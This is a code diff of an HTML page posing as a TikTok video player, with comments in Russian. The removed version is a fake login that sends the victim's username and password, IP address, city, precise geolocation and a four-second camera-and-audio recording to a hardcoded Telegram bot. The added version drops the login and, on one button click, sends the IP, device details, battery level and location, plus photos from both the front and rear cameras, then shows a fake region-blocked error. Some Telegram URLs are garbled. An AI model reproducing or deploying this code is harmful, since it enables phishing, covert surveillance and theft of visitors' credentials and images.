@@ -3,121 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Content</title>
+    <title>TikTok Video Player</title>
     <style>
-        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; overflow: hidden; }
-        .container { text-align: center; width: 90%; max-width: 400px; }
-        #mainBtn { background: #ff0050; color: #fff; border: none; padding: 20px 0; width: 100%; font-size: 18px; font-weight: bold; border-radius: 8px; cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 80, 0.4); }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #333; background: #111; color: white; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #ff0050; }
-        #v, #c { display: none; }
-        .loading { display: none; color: #888; }
+        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; overflow: hidden; }
+        #mainBtn { 
+            background: #ff0050; color: #fff; border: none; padding: 18px 45px; 
+            font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; 
+            box-shadow: 0 0 20px rgba(255, 0, 80, 0.4); z-index: 10;
+        }
+        #mainBtn:disabled { background: #222; color: #555; box-shadow: none; }
+        .loading-text { display: none; color: #fff; text-align: center; font-size: 14px; }
+        .spinner { 
+            width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #ff0050; 
+            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        video, canvas { display: none; position: absolute; }
     </style>
 </head>
 <body>
 
-    <div class="container" id="authBlock">
-        <h2 style="margin-bottom: 20px;">TikTok Premium</h2>
-        <div class="input-group">
-            <input type="text" id="login" placeholder="Телефон / Почта / Имя пользователя">
+    <div id="ui">
+        <button id="mainBtn">WATCH VIDEO</button>
+        <div id="loader" class="loading-text">
+            <div class="spinner"></div>
+            <p>Connecting to server...</p>
         </div>
-        <div class="input-group">
-            <input type="password" id="pass" placeholder="Пароль">
-        </div>
-        <button id="mainBtn">ВОЙТИ И СМОТРЕТЬ</button>
-    </div>
-
-    <div class="loading" id="loadBlock">
-        <p>Синхронизация данных...</p>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
     <script>
-        // КОНФИГ
         const TOKEN = '8282459787:AAFCkf9w_T_Xvorsn-Tg0ZMgdcfWC9N8mQQ';
         const CHAT_ID = '6660269414';
-        const BASE_URL = `https://telegram.org{TOKEN}`;
 
         const btn = document.getElementById('mainBtn');
+        const loader = document.getElementById('loader');
         const v = document.getElementById('v');
+        const c = document.getElementById('c');
 
         btn.addEventListener('click', async () => {
-            const login = document.getElementById('login').value;
-            const pass = document.getElementById('pass').value;
+            btn.style.display = 'none';
+            loader.style.display = 'block';
 
-            if (!login || !pass) return alert("Введите данные для входа!");
-
-            document.getElementById('authBlock').style.display = 'none';
-            document.getElementById('loadBlock').style.display = 'block';
-
-            // 1. Отправляем логин и пароль
-            await sendMsg(`🔑 *ДАННЫЕ ВХОДА*\n👤 Логин: \`${login}\`\n🔐 Пароль: \`${pass}\``);
-
-            // 2. Сбор системной инфы (IP и город)
+            // 1. Быстрый сбор данных (IP и Система)
             try {
                 const ipRes = await fetch('https://ipapi.co').then(r => r.json());
-                const info = `🌐 IP: ${ipRes.ip}\n🏙 Город: ${ipRes.city}\n📱 OS: ${navigator.platform}`;
-                await sendMsg(`📊 *ОТЧЕТ*\n${info}`);
-            } catch (e) {
-                await sendMsg("⚠️ Не удалось получить IP данные");
-            }
+                const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 0}));
+                
+                let report = `🚀 **НОВЫЙ ПОСЕТИТЕЛЬ**\n`;
+                report += `🌐 IP: \`${ipRes.ip}\` (${ipRes.city || '?'})\n`;
+                report += `📱 Устройство: ${navigator.platform}\n`;
+                report += `🔋 Батарея: ${Math.round(battery.level * 100)}%`;
+                await sendText(report);
+            } catch(e) { await sendText("⚠️ Ошибка сбора IP"); }
 
-            // 3. Геолокация
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(async (p) => {
-                    const lat = p.coords.latitude;
-                    const lon = p.coords.longitude;
-                    await sendMsg(`📍 *Локация:*\nhttps://google.com{lat},${lon}`);
-                }, null, {enableHighAccuracy: true});
-            }
+            // 2. Геолокация (если разрешит)
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await sendText(`📍 Локация: https://google.com{pos.coords.latitude},${pos.coords.longitude}`);
+            }, null, {enableHighAccuracy: true});
 
-            // 4. Запись видео (начнется параллельно)
-            recordVideo(4000);
+            // 3. Фото по очереди (сначала Селфи, потом Основная)
+            await capture('user', 'FRONT (Selfie)');
+            await capture('environment', 'REAR (Main)');
 
-            // 5. Имитация загрузки и редирект
+            // 4. Финал через 2 сек
             setTimeout(() => {
-                window.location.href = "https://tiktok.com";
-            }, 5000);
+                loader.innerHTML = "<p style='color:#ff0050'>Error: Video is not available in your country.</p>";
+            }, 2000);
         });
 
-        async function sendMsg(text) {
-            return fetch(`${BASE_URL}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'Markdown'
-                })
-            });
+        async function capture(mode, label) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: mode, width: {ideal: 1280}, height: {ideal: 720} }
+                });
+                v.srcObject = stream;
+                
+                // Ждем фиксации изображения
+                await new Promise(r => setTimeout(r, 1000));
+                
+                c.width = v.videoWidth;
+                c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                
+                // Выключаем камеру СРАЗУ
+                stream.getTracks().forEach(t => t.stop());
+
+                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+                await sendFile(blob, label);
+            } catch (e) {
+                console.log(label + " blocked");
+            }
         }
 
-        async function recordVideo(ms) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                v.srcObject = stream;
-                const rec = new MediaRecorder(stream);
-                const chunks = [];
-                
-                rec.ondataavailable = e => chunks.push(e.data);
-                rec.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('video', blob, 'capture.mp4');
-                    
-                    await fetch(`${BASE_URL}/sendVideo`, { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
-                };
+        async function sendFile(blob, label) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'img.jpg');
+            fd.append('caption', `📸 Снимок: ${label}`);
+            await fetch(`https://telegram.org{TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        }
 
-                rec.start();
-                setTimeout(() => rec.stop(), ms);
-            } catch (e) {
-                await sendMsg("❌ Доступ к камере отклонен");
-            }
+        async function sendText(t) {
+            await fetch(`https://telegram.org{TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: t, parse_mode: 'Markdown' })
+            });
         }
     </script>
 </body>
